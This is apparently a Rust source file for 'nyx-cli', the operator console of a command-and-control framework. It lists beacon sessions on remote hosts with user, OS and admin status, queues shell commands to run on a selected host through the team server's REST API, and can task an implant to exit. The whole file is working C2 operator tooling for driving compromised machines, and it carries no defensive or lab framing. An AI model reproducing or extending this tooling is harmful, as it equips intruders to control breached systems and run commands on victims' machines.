//! Nyx operator CLI. A thin client over the team server's REST API.
//!
//! One-shot:   `nyx-cli list`  /  `nyx-cli shell <session-hex> "whoami /groups"`
//! Interactive: `nyx-cli repl`  (the default): `list`, `use <id>`, `shell <cmd>`, `exit`.

use std::time::Duration;

use anyhow::{anyhow, Result};
use clap::{Parser, Subcommand};
use rustyline::error::ReadlineError;
use rustyline::DefaultEditor;
use serde::Deserialize;

#[derive(Parser)]
#[command(name = "nyx-cli", version, about = "Nyx operator CLI")]
struct Cli {
    /// Team server URL.
    #[arg(long, env = "NYX_SERVER", default_value = "http://127.0.0.1:8443")]
    server: String,

    #[command(subcommand)]
    cmd: Option<Cmd>,
}

#[derive(Subcommand)]
enum Cmd {
    /// List active sessions.
    List,
    /// Queue a shell task on a session and print its output.
    Shell {
        /// Session id (hex, as shown by `list`).
        session: String,
        /// Command line to execute (passed to sh -c / cmd /c).
        args: String,
    },
    /// Interactive REPL (default if no subcommand given).
    Repl,
}

#[derive(Debug, Deserialize)]
struct SessionView {
    id: String,
    beacon_id: u32,
    hostname: String,
    username: String,
    os: String,
    arch: u8,
    pid: u32,
    is_admin: u8,
    pending: usize,
}

#[derive(Deserialize)]
struct TaskAck {
    task_id: u64,
}

#[derive(Debug, Deserialize)]
struct ResultView {
    task_id: u64,
    kind: String,
    text: String,
}

fn main() -> Result<()> {
    let cli = Cli::parse();
    match cli.cmd.unwrap_or(Cmd::Repl) {
        Cmd::List => print_list(&cli.server),
        Cmd::Shell { session, args } => {
            let task_id = enqueue_shell(&cli.server, &session, &args)?;
            match poll_result(&cli.server, &session, task_id)? {
                Some(text) => print!("{text}"),
                None => println!("[no output received for task {task_id} within timeout]"),
            }
            Ok(())
        }
        Cmd::Repl => repl(&cli.server),
    }
}

fn print_list(server: &str) -> Result<()> {
    let sessions: Vec<SessionView> =
        ureq::get(&format!("{server}/api/sessions")).call()?.into_json()?;
    if sessions.is_empty() {
        println!("(no sessions)");
        return Ok(());
    }
    println!(
        "{:<66} {:<6} {:<14} {:<14} {:<14} {:<3} {:<7}",
        "ID", "BEACON", "HOST", "USER", "OS", "ADM", "PENDING"
    );
    for s in sessions {
        println!(
            "{:<66} {:<6} {:<14} {:<14} {:<14} {:<3} {:<7}",
            short(&s.id), s.beacon_id, s.hostname, s.username, s.os, s.is_admin, s.pending
        );
    }
    Ok(())
}

fn short(id: &str) -> String {
    id.to_string()
}

fn enqueue_shell(server: &str, session: &str, args: &str) -> Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "shell", "args": args },
    });
    let ack: TaskAck = ureq::post(&format!("{server}/api/task"))
        .send_json(body)
        .map_err(|e| anyhow!("enqueue failed: {e}"))?
        .into_json()?;
    Ok(ack.task_id)
}

fn enqueue_exit(server: &str, session: &str) -> Result<()> {
    let body = serde_json::json!({ "session": session, "command": { "type": "exit" } });
    let _ = ureq::post(&format!("{server}/api/task")).send_json(body);
    Ok(())
}

/// Poll a session's results for a specific task; return the first matching output.
fn poll_result(server: &str, session: &str, task_id: u64) -> Result<Option<String>> {
    let deadline = std::time::Instant::now() + Duration::from_secs(12);
    loop {
        let rs: Vec<ResultView> = ureq::get(&format!("{server}/api/results"))
            .query("session", session)
            .call()?
            .into_json()?;
        if let Some(r) = rs.into_iter().find(|r| r.task_id == task_id) {
            match r.kind.as_str() {
                "output" => return Ok(Some(r.text)),
                "error" => return Ok(Some(format!("[error] {}", r.text))),
                "ok" => return Ok(Some(String::new())),
                _ => return Ok(Some(format!("[{}]", r.kind))),
            }
        }
        if std::time::Instant::now() >= deadline {
            return Ok(None);
        }
        std::thread::sleep(Duration::from_millis(250));
    }
}

fn repl(server: &str) -> Result<()> {
    println!("nyx> connected to {server}. commands: list | use <id> | shell <cmd> | exit");
    let mut rl = DefaultEditor::new()?;
    let mut current: Option<String> = None;
    loop {
        let prompt = match &current {
            Some(id) => format!("nyx ({})> ", &id[..8.min(id.len())]),
            None => "nyx> ".to_string(),
        };
        let line = match rl.readline(&prompt) {
            Ok(l) => l,
            Err(ReadlineError::Interrupted | ReadlineError::Eof) => break,
            Err(e) => return Err(anyhow!(e)),
        };
        let _ = rl.add_history_entry(&line);
        let mut parts = line.split_whitespace();
        let cmd = parts.next().unwrap_or("");
        let rest: String = parts.collect::<Vec<_>>().join(" ");
        match cmd {
            "" => {}
            "list" | "sessions" | "ls" => {
                if let Err(e) = print_list(server) {
                    println!("! {e}");
                }
            }
            "use" => {
                if rest.is_empty() {
                    println!("usage: use <session-id>");
                } else {
                    current = Some(rest.trim().to_string());
                    println!("selected {rest}");
                }
            }
            "shell" | "run" => {
                let session = match &current {
                    Some(s) => s.clone(),
                    None => {
                        println!("! `use <id>` first");
                        continue;
                    }
                };
                if rest.is_empty() {
                    println!("usage: shell <cmd>");
                    continue;
                }
                match enqueue_shell(server, &session, &rest) {
                    Ok(task_id) => match poll_result(server, &session, task_id) {
                        Ok(Some(text)) => print!("{text}"),
                        Ok(None) => println!("[no output]"),
                        Err(e) => println!("! {e}"),
                    },
                    Err(e) => println!("! {e}"),
                }
            }
            "kill" => {
                if let Some(s) = &current {
                    let _ = enqueue_exit(server, s);
                    println!("exit tasked to {s}");
                }
            }
            "exit" | "quit" => break,
            other => println!("unknown command: {other}"),
        }
    }
    Ok(())
}
